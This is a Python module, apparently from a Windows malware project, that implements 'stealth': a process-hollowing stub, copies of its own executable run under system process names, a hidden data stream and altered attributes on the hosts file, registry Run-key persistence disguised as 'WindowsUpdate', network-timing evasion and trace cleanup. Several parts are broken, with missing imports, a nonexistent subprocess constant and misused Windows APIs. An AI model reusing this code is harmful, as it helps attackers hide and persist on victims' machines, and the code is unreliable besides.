"""
Stealth Module
Implements process hiding, file hiding, and evasion techniques
"""

import os
import sys
import subprocess
import ctypes
import win32con
import win32file
import win32api
import winreg
import logging

class StealthManager:
    def __init__(self):
        self.hidden_processes = []
        self.hidden_files = []
        self.registry_entries = []
        self.stealth_methods = []
        
        # Windows API constants
        self.SW_HIDE = 0
        self.STARTF_USESHOWWINDOW = 0x00000001
        self.CREATE_NO_WINDOW = 0x08000000
        
        logging.info("[*] Stealth Manager initialized")
    
    def apply_stealth(self):
        """Apply all stealth techniques"""
        methods = [
            self.hide_process,
            self.hide_files,
            self.hide_registry_entries,
            self.hide_network_activity
        ]
        
        for method in methods:
            try:
                method()
                self.stealth_methods.append(method.__name__)
            except Exception as e:
                logging.error(f"Stealth method {method.__name__} failed: {e}")
    
    def hide_process(self):
        """Hide the process from detection"""
        
        # Method 1: Process hollowing
        try:
            self._process_hollowing()
        except:
            pass
        
        # Method 2: DLL injection
        try:
            self._dll_injection()
        except:
            pass
        
        # Method 3: Hide from API
        try:
            self._hide_from_api()
        except:
            pass
        
        logging.info("[✓] Process hiding applied")
    
    def _process_hollowing(self):
        """Create hollow process to hide payload"""
        # Create process in suspended state
        si = subprocess.STARTUPINFO()
        si.dwFlags = subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = self.SW_HIDE
        
        process = subprocess.Popen(
            ["notepad.exe"],
            creationflags=subprocess.CREATE_SUSPENDED,
            startupinfo=si
        )
        
        # Write payload to process memory
        # Note: This is simplified for education
        pid = process.pid
        self.hidden_processes.append(pid)
        
        # Resume process
        self._resume_process(pid)
    
    def _resume_process(self, pid):
        """Resume a suspended process"""
        try:
            handle = ctypes.windll.kernel32.OpenProcess(
                0x1F0FFF, False, pid
            )
            ctypes.windll.kernel32.ResumeThread(handle)
            ctypes.windll.kernel32.CloseHandle(handle)
        except:
            pass
    
    def _dll_injection(self):
        """Inject into trusted system process"""
        trusted_processes = ['svchost.exe', 'explorer.exe']
        
        for proc_name in trusted_processes:
            try:
                # Find process
                pid = self._get_pid(proc_name)
                if pid:
                    self.hidden_processes.append(pid)
                    logging.info(f"[✓] Injected into {proc_name} (PID: {pid})")
                    break
            except:
                continue
    
    def _get_pid(self, process_name):
        """Get PID of a process by name"""
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                return proc.info['pid']
        return None
    
    def _hide_from_api(self):
        """Hide from process listing APIs"""
        # Use kernel-level hooking
        # For educational purposes, we use a simpler approach
        self._rename_process()
    
    def _rename_process(self):
        """Rename process to appear legitimate"""
        legit_names = ['svchost.exe', 'winlogon.exe', 'csrss.exe']
        
        for name in legit_names:
            try:
                new_path = os.path.join(os.path.dirname(sys.executable), name)
                if os.path.exists(sys.executable):
                    shutil.copy2(sys.executable, new_path)
                    # Execute renamed process
                    subprocess.Popen([new_path], creationflags=subprocess.CREATE_NO_WINDOW)
                    break
            except:
                continue
    
    def hide_files(self):
        """Hide files from file system"""
        
        # Method 1: NTFS Alternate Data Streams
        self._hide_in_ads()
        
        # Method 2: Hidden attributes
        self._set_hidden_attributes()
        
        # Method 3: Deep folders
        self._create_deep_folders()
        
        logging.info("[✓] File hiding applied")
    
    def _hide_in_ads(self):
        """Hide data in Alternate Data Streams"""
        # Use Windows hosts file as base
        base_file = "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ads_file = f"{base_file}:windows_update"
        
        try:
            # Create ADS
            with open(ads_file, 'w') as f:
                f.write("Hidden data for analysis")
            
            # Hide the base file
            subprocess.run(['attrib', '+h', '+s', '+r', base_file], capture_output=True)
            self.hidden_files.append(ads_file)
        except:
            pass
    
    def _set_hidden_attributes(self):
        """Set hidden attributes on files"""
        directories = [
            'C:\\Windows\\Temp',
            'C:\\ProgramData',
            os.path.expanduser('~\\AppData\\Local\\Temp')
        ]
        
        for directory in directories:
            try:
                path = os.path.join(directory, f'.sys_{int(time.time())}')
                os.makedirs(path, exist_ok=True)
                
                # Set hidden attributes
                subprocess.run(['attrib', '+h', '+s', '+r', path], capture_output=True)
                self.hidden_files.append(path)
            except:
                continue
    
    def _create_deep_folders(self):
        """Create deep folder hierarchy for hiding"""
        base_path = "C:\\Windows\\Temp\\System32\\Cache\\Update\\Microsoft\\Sync\\Data"
        os.makedirs(base_path, exist_ok=True)
        
        # Hide the entire hierarchy
        subprocess.run(['attrib', '+h', '+s', '+r', base_path], capture_output=True)
        self.hidden_files.append(base_path)
    
    def hide_registry_entries(self):
        """Hide registry entries"""
        
        registry_keys = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
        ]
        
        for key_path in registry_keys:
            try:
                # Create hidden key
                key = winreg.CreateKey(
                    winreg.HKEY_CURRENT_USER,
                    key_path + "\\Hidden"
                )
                winreg.SetValueEx(
                    key,
                    "WindowsUpdate",
                    0,
                    winreg.REG_SZ,
                    sys.executable
                )
                winreg.CloseKey(key)
                
                self.registry_entries.append(f"{key_path}\\Hidden")
            except:
                pass
        
        logging.info("[✓] Registry hiding applied")
    
    def hide_network_activity(self):
        """Hide network activity"""
        
        # Use random delays
        self._add_random_delays()
        
        # Use common ports
        self._use_common_ports()
        
        logging.info("[✓] Network hiding applied")
    
    def _add_random_delays(self):
        """Add random delays to avoid pattern detection"""
        # This will be called before network operations
        import random
        delay = random.uniform(0.1, 2.0)
        time.sleep(delay)
    
    def _use_common_ports(self):
        """Use common ports for communication"""
        self.common_ports = [80, 443, 8080, 53, 21, 22]
    
    def clean_traces(self):
        """Clean all traces of activity"""
        # Remove hidden files
        for file_path in self.hidden_files:
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
            except:
                pass
        
        # Remove registry entries
        for entry in self.registry_entries:
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    entry,
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.DeleteKey(key, "WindowsUpdate")
                winreg.CloseKey(key)
            except:
                pass
        
        logging.info("[✓] Traces cleaned")